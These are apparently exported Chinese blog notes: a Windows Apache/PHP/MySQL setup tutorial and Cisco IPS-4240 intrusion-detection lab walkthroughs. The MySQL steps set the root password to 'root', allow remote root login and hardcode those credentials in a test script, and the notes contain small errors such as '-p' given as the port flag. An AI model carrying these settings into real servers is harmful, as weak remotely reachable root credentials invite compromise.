<p><img src="/images/php/php-notepad/Apache%E5%AE%89%E8%A3%85%E6%88%90%E5%8A%9F.png" srcset="/img/loading.gif" alt="Apache安装成功"></p>
<h4 id="3-安装PHP"><a href="#3-安装PHP" class="headerlink" title="3. 安装PHP"></a>3. 安装PHP</h4><ul>
<li>PHP：<a href="https://windows.php.net/download#php-7.4" target="_blank" rel="noopener">https://windows.php.net/download#php-7.4</a><ul>
<li>根据系统版本选择对应的PHP服务</li>
<li>根据Apache选择对应的编译环境</li>
<li>选择Thread Safe线程安全的形式</li>
</ul>
</li>
<li>安装<ul>
<li>▲ 目录路径不可为中文</li>
<li>将文件解压到新建的server目录，命名为PHP7.4.3</li>
<li>可通过php.exe运行命令来指定要解析的PHP脚本 -&gt; php.exe  -f  PHP文件所在路径的index.php文件 -&gt; hello world</li>
</ul>
</li>
<li>目录说明<ul>
<li>ext：扩展包-&gt;PHP很多功能是通过加载扩展来实现</li>
<li>php7apache2_4.dll：Apache支持包</li>
<li>php.exe：PHP解释器</li>
</ul>
</li>
<li>配置Apache加载PHP模块<ul>
<li>▲ 配置Apache文件：httpd.conf</li>
<li>Apache加载PHP模块：在Apache的主配置文件中加载对应的PHP提供的模块<ul>
<li>LoadModule php7_module PHP所提供的模块链接所在路径</li>
</ul>
</li>
<li>Apache分配工作给PHP模块：如果是PHP代码就交给PHP处理–文件后缀判断<ul>
<li>AddType application/x-httpd-php .php</li>
</ul>
</li>
<li>将PHP的配置文件加载到Apache配置文件中<ul>
<li>PHPIniDir php.ini所在路径</li>
</ul>
</li>
</ul>
</li>
</ul>
<p><img src="/images/php/php-notepad/%E9%85%8D%E7%BD%AEApache%E5%8A%A0%E8%BD%BDPHP%E6%A8%A1%E5%9D%97.png" srcset="/img/loading.gif" alt="配置Apache加载PHP模块"></p>
<ul>
<li>配置文件<ul>
<li>php.ini文件默认是不存在的，是以development存在，复制一份，修改命名为php.ini</li>
</ul>
</li>
<li>测试<ul>
<li>新建一个index.php文件</li>
<li>浏览器访问localhost/index.php</li>
</ul>
</li>
</ul>
<pre><code>&lt;?php
    phpinfo();
?&gt;</code></pre><p><img src="/images/php/php-notepad/PHP%E5%AE%89%E8%A3%85%E6%88%90%E5%8A%9F.png" srcset="/img/loading.gif" alt="PHP安装成功"></p>
<h4 id="4-MySQL安装"><a href="#4-MySQL安装" class="headerlink" title="4. MySQL安装"></a>4. MySQL安装</h4><ul>
<li>MySQL：<a href="https://www.mysql.com/downloads/" target="_blank" rel="noopener">https://www.mysql.com/downloads/</a><ul>
<li>根据系统版本选择对应的MySQL服务</li>
<li>安装mysql一般安装5.x版本，7.x版本为一定程度的阉割版</li>
</ul>
</li>
<li>安装<ul>
<li>Custome：自定义安装（选择安装路径）<ul>
<li>MySQL Server -&gt; server/mysql</li>
<li>Server data files -&gt; server/mysql/data</li>
</ul>
</li>
<li>Launch the MySQL Instance Configuration Wizard：配置<ul>
<li>Please select a configuration -&gt; Detailed Configuration：详细配置</li>
<li>Please select a server type -&gt; Developer Machine：开发环境</li>
<li>Please select the database usage -&gt; Multifunctional Database：多功能</li>
<li>Please set the approximate number of cocurrent connections to the server -&gt; Manual Setting(15):并发设置</li>
<li>Please set the networking options<ul>
<li>Enable TCP/IP Networking  -&gt; 允许TCP/IP协议访问<ul>
<li>Prot Number -&gt; 3306</li>
<li>Add firewall exception for this port -&gt; 防火墙通过</li>
</ul>
</li>
<li>Enable Strict Mode -&gt; 使用严格模式</li>
</ul>
</li>
<li>Please select the default set -&gt; Manual Selected Default Character Set / Collation:字符集设定 -&gt; utf8</li>
<li>Please set the Windows options <ul>
<li>Install As Windows Service：服务安装<ul>
<li>Service Name：MySQL</li>
<li>Launch the MySQL Server automatically：随系统启动</li>
</ul>
</li>
<li>Include Bin Directory in Windows PATH：讲MySQL加到系统路径</li>
</ul>
</li>
<li>Please set the security options<ul>
<li>Modify security settings<ul>
<li>New root password -&gt; root</li>
<li>Confirm -&gt; root</li>
<li>Enable root access from remote machines：允许远程访问</li>
</ul>
</li>
</ul>
</li>
</ul>
</li>
</ul>
</li>
</ul>
<p><img src="/images/php/php-notepad/MySQL%E5%AE%89%E8%A3%85%E6%88%90%E5%8A%9F.png" srcset="/img/loading.gif" alt="MySQL安装成功"></p>
<ul>
<li>目录说明<ul>
<li>bin：执行文件夹<ul>
<li>mysql.exe：访问MySQL服务器的客户端</li>
<li>mysqld.exe：MySQL服务</li>
<li>mysqldump.exe：MySQL的备份软件客户端</li>
</ul>
</li>
<li>data：数据存储文件夹</li>
<li>lib：核心文件夹</li>
<li>my.ini：配置文件</li>
</ul>
</li>
<li>测试mysql服务<ul>
<li>cmd -&gt; mysql -u root -p</li>
<li>参数<ul>
<li>-h：主机地址</li>
<li>-p：端口</li>
<li>-u：用户名</li>
<li>-p：密码</li>
</ul>
</li>
</ul>
</li>
<li>PHP连接MySQL数据库<ul>
<li>▲ 配置php文件：php.ini</li>
<li>PHP的扩展都是在ext文件夹中，需要制定扩展所在路径：extension_dir=”/server/php7.4.3/ext”</li>
<li>开启sqli扩展：extension=mysqli</li>
<li>开启pdo_mysql扩展：extension=pdo_mysql</li>
</ul>
</li>
</ul>
<p><img src="/images/php/php-notepad/PHP%E8%BF%9E%E6%8E%A5MySQL%E6%95%B0%E6%8D%AE%E5%BA%93.png" srcset="/img/loading.gif" alt="PHP连接MySQL数据库"></p>
<ul>
<li>测试PHP连接mysql<ul>
<li>新建一个testmysql.php文件</li>
<li>浏览器访问localhost/testmysql.py，查看是否出现OK！</li>
</ul>
</li>
</ul>
<pre><code>&lt;?php
    $link=mysqli_connect(&#39;localhost&#39;,&#39;root&#39;,&#39;root&#39;);
    if(!$link) echo &quot;Error !&quot;;
    else echo &quot;Ok!&quot;;
    mysqli_close($link);
?&gt;</code></pre><p><img src="/images/php/php-notepad/phpinfo--mysqli.png" srcset="/img/loading.gif" alt="phpinfo--mysqli"></p>
<p><img src="/images/php/php-notepad/phpinfo--pdo_mysql.png" srcset="/img/loading.gif" alt="phpinfo--pdo_mysql"></p>
<h4 id="5-搭建域名"><a href="#5-搭建域名" class="headerlink" title="5. 搭建域名"></a>5. 搭建域名</h4><ul>
<li>修改hosts文件 -&gt; 127.0.0.1  localhost</li>
</ul>
<h4 id="6-搭建虚拟主机"><a href="#6-搭建虚拟主机" class="headerlink" title="6. 搭建虚拟主机"></a>6. 搭建虚拟主机</h4><ul>
<li>官方解释文档：<a href="http://httpd.apache.org/docs/current/vhosts/" target="_blank" rel="noopener">http://httpd.apache.org/docs/current/vhosts/</a></li>
<li>配置虚拟主机方式<ul>
<li>基于IP</li>
<li>基于主机名</li>
<li>基于端口</li>
</ul>
</li>
<li>实验环境<ul>
<li>在Apache下的htdocs目录中，新建两个目录，test1和test2<ul>
<li>test1目录下1.php（<?php phpinfo(); ?>）</li>
<li>test2目录下2.php（<?php echo "OKKKK" ?>）</li>
<li>▲ 2020.03.05在查询资料的过程中，有遇到test目录可以建立在htdocs的情况，但实操发现不行</li>
</ul>
</li>
<li>本地模拟外网域名，在hosts文件中配置两个测试域名<ul>
<li>127.0.0.1 <a href="http://www.test1mzt.com" target="_blank" rel="noopener">www.test1mzt.com</a></li>
<li>127.0.0.1 <a href="http://www.test2mzt.com" target="_blank" rel="noopener">www.test2mzt.com</a></li>
</ul>
</li>
<li>修改配置（Apache24\conf\httpd.conf）<ul>
<li>#Virtual hosts -&gt; Include conf/extra/httpd-vhosts.conf</li>
</ul>
</li>
</ul>
</li>
</ul>
<p><img src="/images/php/php-notepad/%E8%99%9A%E6%8B%9F%E4%B8%BB%E6%9C%BAhosts%E6%96%87%E4%BB%B6%E8%AE%BE%E7%BD%AE.png" srcset="/img/loading.gif" alt="虚拟主机hosts文件设置"></p>
<h4 id="7-基于IP的虚拟主机"><a href="#7-基于IP的虚拟主机" class="headerlink" title="7. 基于IP的虚拟主机"></a>7. 基于IP的虚拟主机</h4><ul>
<li>基于IP，一台服务器有多个网卡，每个IP绑定一个站点的方式</li>
<li>▲ 基于IP的方式，写在VirtualHost的IP地址需要可被路由</li>
<li>▲ 在下图，有多种访问方式访问test2下的2.php<ul>
<li>127.0.0.2:80/2.php</li>
<li><a href="http://www.test2mzt.com:80/2.php" target="_blank" rel="noopener">www.test2mzt.com:80/2.php</a></li>
<li><a href="http://www.test2mzt.com/2.php" target="_blank" rel="noopener">www.test2mzt.com/2.php</a></li>
</ul>
</li>
</ul>
<p><img src="/images/php/php-notepad/%E5%9F%BA%E4%BA%8EIP%E7%9A%84%E8%99%9A%E6%8B%9F%E4%B8%BB%E6%9C%BA.png" srcset="/img/loading.gif" alt="基于IP的虚拟主机"></p>
<h4 id="8-基于端口的虚拟主机"><a href="#8-基于端口的虚拟主机" class="headerlink" title="8. 基于端口的虚拟主机"></a>8. 基于端口的虚拟主机</h4><ul>
<li>修改配置文件将原来的：Listen 80改为Listen 80 Listen 88</li>
<li>▲ 基于端口的方式，需要在httpd.conf的配置文件中增加监听端口</li>
<li>▲ 在下图，有多种访问方式访问test2下的2.php<ul>
<li>127.0.0.1:88/2.php</li>
<li><a href="http://www.test2mzt.com:88/2.php" target="_blank" rel="noopener">www.test2mzt.com:88/2.php</a></li>
</ul>
</li>
</ul>
<p><img src="/images/php/php-notepad/%E5%9F%BA%E4%BA%8E%E7%AB%AF%E5%8F%A3%E7%9A%84%E4%B8%BB%E6%9C%BA.png" srcset="/img/loading.gif" alt="基于端口的主机"></p>
<h4 id="9-基于域名的虚拟主机"><a href="#9-基于域名的虚拟主机" class="headerlink" title="9. 基于域名的虚拟主机"></a>9. 基于域名的虚拟主机</h4><ul>
<li>基于主机名也就是基于域名方式访问，每个IP多个站点</li>
<li>▲ 基于域名的方式，需要在hosts文件中指定域名</li>
<li>▲ 在下图，有多种访问方式访问test2下的2.php<ul>
<li>127.0.0.1/2.php</li>
<li><a href="http://www.test2mzt.com/2.php" target="_blank" rel="noopener">www.test2mzt.com/2.php</a></li>
</ul>
</li>
</ul>
<p><img src="/images/php/php-notepad/%E5%9F%BA%E4%BA%8E%E5%9F%9F%E5%90%8D%E7%9A%84%E8%99%9A%E6%8B%9F%E4%B8%BB%E6%9C%BA.png" srcset="/img/loading.gif" alt="基于域名的虚拟主机"></p>
<h4 id="10-注意"><a href="#10-注意" class="headerlink" title="10. 注意"></a>10. 注意</h4><ul>
<li><Directory>目录报错<ul>
<li>▲ 2020.03.05 Apache启动报Invalid command ‘order’, perhaps misspelled or defined by a module not included的错误<ul>
<li>Apache2.4以上，做了修改</li>
<li>在LoadMoudle中，需要通过access_compat_module modules/mod_access_compat.so和actions_module modules/mod_actions.so模块，才能使用”Order、Deny、Allow”写配置文件</li>
<li>若不通过access_compat_module modules/mod_access_compat.so更改，可以使用Apache Require命令</li>
</ul>
</li>
</ul>
</li>
<li>需要给当前设定的站点（目录）访问权限</li>
</ul>
<pre><code>&lt;Directory &#39;站点目录&#39;&gt;
    #设定方式：代表匹配权限的顺序
    Order Deny,Allow    //没有顺序关系：实际顺序有意义
    #限定范围：按照顺序执行
    Deny from 指定的范围
    Allow from 指定范围/all

    #列表显示（若无指定具体访问文件或访问文件夹）
    Options Indexes FollowSymLinks

    #指定默认访问文件
    Directory Indexes FollowSymLinks

    #指定默认访问文件
    DirectoryIndex index.html index.php
&lt;/Directory&gt;</code></pre><ul>
<li>▲ 一旦启用虚拟主机配置文件，那么默认的主机地址localhost就不再生效，如果想要生效就要为localhost增加单独的虚拟主机</li>
<li>▲ 如果说网站中整个网站根目录允许访问，但是其中还有其他文件夹不允许访问：可以增加多个Directory标签，针对不同的文件夹</li>
</ul>
]]></content>
      <categories>
        <category>PHP</category>
      </categories>
      <tags>
        <tag>PHP基础</tag>
      </tags>
  </entry>
  <entry>
    <title>IPS笔记-4：IME--IDS实验</title>
    <url>/2020/03/09/IPS%E7%AC%94%E8%AE%B0-4%EF%BC%9AIME--IDS%E5%AE%9E%E9%AA%8C/</url>
    <content><![CDATA[<hr>
<h4 id="1-IDS模拟实验"><a href="#1-IDS模拟实验" class="headerlink" title="1. IDS模拟实验"></a>1. IDS模拟实验</h4><ul>
<li>R1：Router C3700</li>
<li>R1：Router C3700</li>
<li>IDS：IPS-4240</li>
<li>SW：EtherSwitch router</li>
<li>▲ 2020.03.09 虚拟机IPS-4240的虚拟网卡VMware1和VMware2需要开启主机连接，且若在GNS3中无出现此两个网卡，可重启计算机，即可抓到这两个网卡</li>
</ul>
<p><img src="/images/ips/ips-notepad/IPS-4240%E5%BC%80%E5%90%AF%E7%9A%84%E4%B8%BB%E6%9C%BA%E8%BF%9E%E6%8E%A5.png" srcset="/img/loading.gif" alt="IPS-4240开启的主机连接"></p>
<p><img src="/images/ips/ips-notepad/IDS%E6%9D%82%E5%90%88%E6%A8%A1%E5%BC%8F%E6%8A%A5%E8%AD%A6%E6%8B%93%E6%89%91%E5%9B%BE.png" srcset="/img/loading.gif" alt="IDS杂合模式报警拓扑图"></p>
<h4 id="2-IDS：IPS-4240"><a href="#2-IDS：IPS-4240" class="headerlink" title="2. IDS：IPS-4240"></a>2. IDS：IPS-4240</h4><ul>
<li>改变外形：右键 -&gt; Change Symbol -&gt; ids</li>
<li>修改名字：右键 -&gt; Change the hostname -&gt; IDS</li>
<li>增加监控网卡：Configure -&gt; NIO Ethernet -&gt; Add VMnet1</li>
</ul>
<h4 id="3-R1和R2"><a href="#3-R1和R2" class="headerlink" title="3. R1和R2"></a>3. R1和R2</h4><ul>
<li>启动，降低系统资源消耗：右键 -&gt; Idle PC -&gt; 选取带*号的参数设备</li>
<li>配置R1<ul>
<li>conf t</li>
<li>interface f0/1</li>
<li>ip add 10.1.1.1 255.255.255.0</li>
<li>no sh</li>
</ul>
</li>
<li>配置R2<ul>
<li>conf t</li>
<li>interface f0/1</li>
<li>ip add 10.1.1.2 255.255.255.0</li>
<li>no sh</li>
</ul>
</li>
<li>连通性：R1 -&gt; do ping 10.1.1.2 -&gt; R2是否联通</li>
</ul>
<h4 id="4-SW：EtherSwitch-router"><a href="#4-SW：EtherSwitch-router" class="headerlink" title="4. SW：EtherSwitch router"></a>4. SW：EtherSwitch router</h4><ul>
<li>启动，降低系统资源消耗：右键 -&gt; Idle PC -&gt; 选取带*号的参数设备</li>
<li>修改名字：右键 -&gt; Change the hostname -&gt; SW</li>
<li>增加接口：右键 -&gt; Slots -&gt; 增加一个NM-16ESW</li>
</ul>
<h4 id="5-测试连通性"><a href="#5-测试连通性" class="headerlink" title="5. 测试连通性"></a>5. 测试连通性</h4><ul>
<li>R1(f 1/0)-&gt; SW(f 1/1)</li>
<li>R2(f 1/0)-&gt; SW(f 1/2)</li>
<li>IDS -&gt; SW(f 1/15)</li>
<li>连通性：R1 -&gt; ping 10.1.1.2 -&gt; R2是否连通</li>
</ul>
<h4 id="6-SPAN配置"><a href="#6-SPAN配置" class="headerlink" title="6. SPAN配置"></a>6. SPAN配置</h4><ul>
<li>SW：EtherSwitch router<ul>
<li>monitor session 1 source interface f1/1 rx  //R1</li>
<li>monitor session 1 destination interface f1/15  //IDS</li>
</ul>
</li>
</ul>
<h4 id="7-入侵检测"><a href="#7-入侵检测" class="headerlink" title="7. 入侵检测"></a>7. 入侵检测</h4><ul>
<li>▲ 所有的步骤都需要进行Apply</li>
<li>IME启动IPS</li>
<li>开启Interface接口<ul>
<li>Configuration -&gt; Interface -&gt; GigabitEthernet 0/0 -&gt; Edit -&gt; enable</li>
</ul>
</li>
</ul>
<p><img src="/images/ips/ips-notepad/IME--IDS%E5%BC%80%E5%90%AFInterface%E6%8E%A5%E5%8F%A3.png" srcset="/img/loading.gif" alt="IME--IDS开启Interface接口"></p>
<ul>
<li>绑定病毒特征识别库Sig0<ul>
<li>Configuration -&gt; Policies -&gt; vs0 -&gt; Edit -&gt; GigabitEthernet 0/0</li>
</ul>
</li>
</ul>
<p><img src="/images/ips/ips-notepad/IME--IDS%E7%BB%91%E5%AE%9A%E7%97%85%E6%AF%92%E7%89%B9%E5%BE%81%E8%AF%86%E5%88%AB%E5%BA%93Sig0.png" srcset="/img/loading.gif" alt="IME--IDS绑定病毒特征识别库Sig0"></p>
<ul>
<li>配置病毒特征识别库Sig0<ul>
<li>Sig0 -&gt; OS -&gt; 2004(过滤) -&gt; Change status To -&gt; Active</li>
<li>Sig0 -&gt; OS -&gt; 2004(过滤) -&gt; Enable</li>
</ul>
</li>
</ul>
<p><img src="/images/ips/ips-notepad/IME--IDS%E9%85%8D%E7%BD%AE%E7%97%85%E6%AF%92%E7%89%B9%E5%BE%81%E8%AF%86%E5%88%AB%E5%BA%93Sig0.png" srcset="/img/loading.gif" alt="IME--IDS配置病毒特征识别库Sig0"></p>
<ul>
<li>监控IDS-ICMP事件<ul>
<li>Configuration -&gt; Sensor Monitoring -&gt; View</li>
</ul>
</li>
</ul>
<p><img src="/images/ips/ips-notepad/IME--IDS%E7%9B%91%E6%8E%A7IDS-ICMP%E4%BA%8B%E4%BB%B6.png" srcset="/img/loading.gif" alt="IME--IDS监控IDS-ICMP事件"></p>
<ul>
<li>R1向R2发生ICMP Echo Requset的Ping包，查看IME–IPS的Event Viewer有无报警日志</li>
</ul>
<p><img src="/images/ips/ips-notepad/IME--IDS%E7%9B%91%E6%8E%A7IDS%E4%BA%8B%E4%BB%B6.png" srcset="/img/loading.gif" alt="IME--IDS监控IDS事件"> </p>
]]></content>
      <categories>
        <category>IPS</category>
      </categories>
      <tags>
        <tag>安全</tag>
        <tag>IPS</tag>
      </tags>
  </entry>
  <entry>
    <title>IPS笔记-3：IME--IPS使用</title>
    <url>/2020/03/09/IPS%E7%AC%94%E8%AE%B0-3%EF%BC%9AIME--IPS%E4%BD%BF%E7%94%A8/</url>
    <content><![CDATA[<hr>
<h4 id="1-常用的网络安全设备"><a href="#1-常用的网络安全设备" class="headerlink" title="1. 常用的网络安全设备"></a>1. 常用的网络安全设备</h4><ul>
<li>防火墙</li>
<li>VPN（虚拟专用网络）</li>
<li>IDS和IPS</li>
<li>杀毒软件</li>
<li>UTM（威胁管理）</li>
</ul>
<h4 id="2-IPS-gt-Sensor-Setup"><a href="#2-IPS-gt-Sensor-Setup" class="headerlink" title="2. IPS -&gt; Sensor Setup"></a>2. IPS -&gt; Sensor Setup</h4><ul>
<li>Network<ul>
<li>Allow Password Recovery：这个选项默认是开启的。用于如果忘记IPS的登陆密码。可以在IPS启机过程当中使用密码恢复功能。把IPS的密码恢复成默认的cisco.注意。这个恢复。不会影响到IPS的一些相关配置。IPS默认是不开启telnet功能的。可以通过这个面板开启。</li>
<li>LOGIN Banner：用于在登陆IPS的时候，弹出相关告警。</li>
</ul>
</li>
</ul>
<p><img src="/images/ips/ips-notepad/IME--IPS--Network.png" srcset="/img/loading.gif" alt="IME--IPS--Network"></p>
<p>![IME–IPS–Login Banner](/images/ips/ips-notepad/IME–IPS–Login Banner.png)</p>
<ul>
<li>Allowed Host/Networks：用于限制哪个台设备，或者哪个网段。可以网管这台IPS。</li>
</ul>
<p><img src="/images/ips/ips-notepad/IME--IPS--Permit.png" srcset="/img/loading.gif" alt="IME--IPS--Permit"></p>
<ul>
<li>Time</li>
</ul>
<p><img src="/images/ips/ips-notepad/IME--IPS--Time.png" srcset="/img/loading.gif" alt="IME--IPS--Time"></p>
<ul>
<li>Authentication：用于管理IPS用户帐号密码，并为某个帐号授权相应权限</li>
<li>权限等级<ul>
<li>Administrator：管理员权限。对于IPS管理和配置来说。是最高权限。可以对IPS的基本网络，网络管理，接口管理，策略管理，日志读取进行配置</li>
<li>Operator：操作者权限。可以对于IPS的策略，日志读取进行配置</li>
<li>Viewer：查看者权限。紧紧只能对IPS的日志进行读取</li>
<li>Service：IPS底层权限。IPS底层修改时使用（通过Console口连接）</li>
</ul>
</li>
</ul>
<p><img src="/images/ips/ips-notepad/IME--IPS--Authentication.png" srcset="/img/loading.gif" alt="IME--IPS--Authentication"></p>
<h4 id="3-IPS出入流量策略"><a href="#3-IPS出入流量策略" class="headerlink" title="3. IPS出入流量策略"></a>3. IPS出入流量策略</h4><ul>
<li><p>Outbound流量</p>
<ul>
<li>IPS对于这种流量不做任何限制。也就是说。只要是路由存在的情况下。并且在IPS去往某个目的IP的过程中，没有策略拒绝这股流量的话。IPS可以抵达网络中任何一个IP主机。</li>
<li>▲ IPS进行这种通信的时候。使用的是管理接口（M口）</li>
</ul>
</li>
<li><p>Inbound流量允许</p>
<ul>
<li>已建立连接的流量（对IPS的一个回程报文，始发者是IPS）</li>
<li>源自于NTP服务器的数据包</li>
<li>Allowed Host所放行的流量。Allowed Host类似于ACL应用在VTY链路。添加条目的时候，可以针对一个主机或者一个子网</li>
</ul>
</li>
</ul>
<h4 id="4-IPS-gt-Interface"><a href="#4-IPS-gt-Interface" class="headerlink" title="4. IPS -&gt; Interface"></a>4. IPS -&gt; Interface</h4><ul>
<li>Bypass<ul>
<li>用于修改</li>
<li>三种模式<ul>
<li>AUTO：自动模式。当IPS检测引擎发生故障的时候，对于流量的监控，自动关闭。直接放行流量（默认形式）</li>
<li>ON：开启旁路模式。IPS对流量的监控直接关闭。对任何来到IPS的流量都不做检测匹配，直接放行</li>
<li>OFF：关闭旁路模式。IPS对于流量的监控是必须的。如果发生检测引擎发送故障，而IPS又使用了这个模式，那么就会对网络造成一定的影响</li>
</ul>
</li>
</ul>
</li>
</ul>
<p><img src="/images/ips/ips-notepad/IME--IPS--Bypass.png" srcset="/img/loading.gif" alt="IME--IPS--Bypass"></p>
<h4 id="5-IPS-gt-Policies"><a href="#5-IPS-gt-Policies" class="headerlink" title="5. IPS -&gt; Policies"></a>5. IPS -&gt; Policies</h4><ul>
<li>Signatures：签名。攻击特征码。IPS匹配攻击流量的关键配置。对于网络中，形形色色各种流量。都是通过Sig去配置匹配指定的一些特殊流量</li>
<li>可以针对某一条sig进行配置：<br>动作，匹配参数，enable状态，退休状态。针对某条sig.进行克隆，编辑。删除。导出。等等一系列配置</li>
</ul>
<p><img src="/images/ips/ips-notepad/IME--IPS--Sig%E7%89%B9%E5%BE%81%E7%A0%81.png" srcset="/img/loading.gif" alt="IME--IPS--Sig特征码"></p>
<ul>
<li>VS：虚拟传感器。可以理解为一个虚拟的IPS。一个VS内，独立关联一个接口。独立的Sig攻击库，独立的规则，独立策略。多个VS之间，关联不同的接口。使用不同的策略。针对不同流量，实现不同的动作。VS之间相互不影响（从IPS软件版本6.X开始）<ul>
<li>描述</li>
<li>关联相关的接口</li>
<li>关联相关的SIG攻击库</li>
<li>关联相关的规则</li>
<li>▲ 可以使用一个策略配置在不同的VS里面。唯独！接口不能够重复配置在其他的VS</li>
</ul>
</li>
</ul>
<p><img src="/images/ips/ips-notepad/IME--IPS--VS1.png" srcset="/img/loading.gif" alt="IME--IPS--VS1"></p>
<ul>
<li>Edit Actions：编辑针对某个Sig被触发后所执行的动作<ul>
<li>告警和日志行为<ul>
<li>Produce Alert–产生告警</li>
<li>Produce Verbose Alert–产生冗长告警。把触发这个Sig的数据抓包，并附在告警里</li>
<li>Log Attacker Packets–Log攻击者。对触发这条Sig的数据报文的源IP地址，在后面的一定时间内（可修改）。对其进行抓包，停止后，可以通过IDM下载这个抓包文件。使用抓包攻击打开，进行数据的分析 —-单一攻击源</li>
<li>Log Victim Packets–Log受害者。对触发这条Sig的数据报文的目的IP地址，在后面的一定时间内（可修改）对其进行抓包。停止后 —-多攻击源</li>
<li>Log Pair Packets–Log pair。对触发这条Sig的数据报文的指定的源和目的地址IP地址，在后面的一定时间内（可修改）。对其进行抓包。停止后，可以通过IDM下载这个抓包文件。使用抓包工具打开，进行数据的分析</li>
<li>Request SNMP Trap–SNMP Trap。需要指定SNMP服务器。把触发这条Sig的告警上传到指定服务器</li>
</ul>
</li>
</ul>
</li>
</ul>
<p>![IME–IPS–Edit Actions](/images/ips/ips-notepad/IME–IPS–Edit Actions.png)</p>
]]></content>
      <categories>
        <category>IPS</category>
      </categories>
      <tags>
        <tag>安全</tag>
        <tag>IPS</tag>
      </tags>
  </entry>
  <entry>
    <title>IPS笔记-5：IME--IPS实验</title>
    <url>/2020/03/09/IPS%E7%AC%94%E8%AE%B0-5%EF%BC%9AIME--IPS%E5%AE%9E%E9%AA%8C/</url>
    <content><![CDATA[<hr>
<h4 id="1-IDS模拟实验"><a href="#1-IDS模拟实验" class="headerlink" title="1. IDS模拟实验"></a>1. IDS模拟实验</h4><ul>
<li>R1：Router C3700</li>
<li>R1：Router C3700</li>
<li>IDS：IPS-4240</li>
<li>SW：以太网交换机</li>
<li>▲ 2020.03.09 虚拟机IPS-4240的虚拟网卡VMware1和VMware2需要开启主机连接，且若在GNS3中无出现此两个网卡，可重启计算机，即可抓到这两个网卡</li>
</ul>
<p><img src="/images/ips/ips-notepad/IPS-4240%E5%BC%80%E5%90%AF%E7%9A%84%E4%B8%BB%E6%9C%BA%E8%BF%9E%E6%8E%A5.png" srcset="/img/loading.gif" alt="IPS-4240开启的主机连接"></p>
<p><img src="/images/ips/ips-notepad/IPS%E5%9C%A8%E7%BA%BF%E6%A8%A1%E5%BC%8F%E6%8A%A5%E8%AD%A6%E6%8B%93%E6%89%91%E5%9B%BE.png" srcset="/img/loading.gif" alt="IPS在线模式报警拓扑图"></p>
<h4 id="2-IDS：IPS-4240"><a href="#2-IDS：IPS-4240" class="headerlink" title="2. IDS：IPS-4240"></a>2. IDS：IPS-4240</h4><ul>
<li>改变外形：右键 -&gt; Change Symbol -&gt; ids</li>
<li>修改名字：右键 -&gt; Change the hostname -&gt; IDS</li>
<li>增加监控网卡：Configure -&gt; NIO Ethernet -&gt; Add VMnet1</li>
<li>增加监控网卡：Configure -&gt; NIO Ethernet -&gt; Add VMnet2</li>
</ul>
<h4 id="3-R1和R2"><a href="#3-R1和R2" class="headerlink" title="3. R1和R2"></a>3. R1和R2</h4><ul>
<li>启动，降低系统资源消耗：右键 -&gt; Idle PC -&gt; 选取带*号的参数设备</li>
<li>配置R1<ul>
<li>conf t</li>
<li>interface f0/1</li>
<li>ip add 10.1.1.1 255.255.255.0</li>
<li>no sh</li>
</ul>
</li>
<li>配置R2<ul>
<li>conf t</li>
<li>interface f0/1</li>
<li>ip add 10.1.1.2 255.255.255.0</li>
<li>no sh</li>
</ul>
</li>
<li>连通性：R1 -&gt; do ping 10.1.1.2 -&gt; R2是否联通</li>
</ul>
<h4 id="4-SW：Ethernet-switch"><a href="#4-SW：Ethernet-switch" class="headerlink" title="4. SW：Ethernet switch"></a>4. SW：Ethernet switch</h4><ul>
<li>启动，降低系统资源消耗：右键 -&gt; Idle PC -&gt; 选取带*号的参数设备</li>
<li>修改名字：右键 -&gt; Change the hostname -&gt; SW</li>
<li>增加接口：右键 -&gt; Slots -&gt; 增加一个NM-16ESW</li>
</ul>
<h4 id="5-测试连通性"><a href="#5-测试连通性" class="headerlink" title="5. 测试连通性"></a>5. 测试连通性</h4><ul>
<li>R1(f 1/0)-&gt; SW(1)</li>
<li>R2(f 1/0)-&gt; SW(2)</li>
<li>IDS -&gt; SW(3)</li>
<li>IDS -&gt; SW(4)</li>
</ul>
<h4 id="6-拓扑配置"><a href="#6-拓扑配置" class="headerlink" title="6. 拓扑配置"></a>6. 拓扑配置</h4><ul>
<li>▲ 所有的步骤都需要进行Apply</li>
<li>IME中配置接口对（mypair）<ul>
<li>Configuration -&gt; Interface Pairs -&gt; Add -&gt; 选取一对接口 -&gt; 开启</li>
</ul>
</li>
</ul>
<p><img src="/images/ips/ips-notepad/IME--IPS%E9%85%8D%E7%BD%AEmypair.png" srcset="/img/loading.gif" alt="IME--IPS配置mypair"></p>
<ul>
<li>绑定病毒特征识别库Sig0<ul>
<li>Configuration -&gt; Policies -&gt; vs0 -&gt; Edit -&gt; mypair</li>
</ul>
</li>
</ul>
<p><img src="/images/ips/ips-notepad/IME--IPS%E7%BB%91%E5%AE%9A%E7%97%85%E6%AF%92%E7%89%B9%E5%BE%81%E8%AF%86%E5%88%AB%E5%BA%93Sig0.png" srcset="/img/loading.gif" alt="IME--IPS绑定病毒特征识别库Sig0"></p>
<ul>
<li><p>划分VLAN</p>
<ul>
<li>SW<ul>
<li>端口1、3属于VLAN2</li>
<li>端口2、4属于VLAN3</li>
</ul>
</li>
</ul>
</li>
<li><p>连通性：R1 -&gt; ping 10.1.1.2 -&gt; R2是否连通</p>
</li>
</ul>
<h4 id="7-入侵检测"><a href="#7-入侵检测" class="headerlink" title="7. 入侵检测"></a>7. 入侵检测</h4><ul>
<li>▲ 所有的步骤都需要进行Apply</li>
<li>配置病毒特征识别库Sig0<ul>
<li>Sig0 -&gt; OS -&gt; 2004(过滤) -&gt; Change status To -&gt; Active</li>
<li>Sig0 -&gt; OS -&gt; 2004(过滤) -&gt; Enable</li>
</ul>
</li>
</ul>
<p><img src="/images/ips/ips-notepad/IME--IPS%E9%85%8D%E7%BD%AE%E7%97%85%E6%AF%92%E7%89%B9%E5%BE%81%E8%AF%86%E5%88%AB%E5%BA%93Sig0.png" srcset="/img/loading.gif" alt="IME--IPS配置病毒特征识别库Sig0"></p>
<ul>
<li>监控IPS-ICMP事件<ul>
<li>Configuration -&gt; Sensor Monitoring -&gt; View</li>
</ul>
</li>
</ul>
<p><img src="/images/ips/ips-notepad/IME--IPS%E7%9B%91%E6%8E%A7IPS-ICMP%E4%BA%8B%E4%BB%B6.png" srcset="/img/loading.gif" alt="IME--IPS监控IPS-ICMP事件"></p>
<ul>
<li>R1向R2发生ICMP Echo Requset的Ping包，查看IME–IPS的Event Viewer有无报警日志</li>
</ul>
<p><img src="/images/ips/ips-notepad/IME--IPS%E7%9B%91%E6%8E%A7IPS%E4%BA%8B%E4%BB%B6.png" srcset="/img/loading.gif" alt="IME--IPS监控IPS事件"> </p>
]]></content>
      <categories>
        <category>IPS</category>
      </categories>
      <tags>
        <tag>安全</tag>
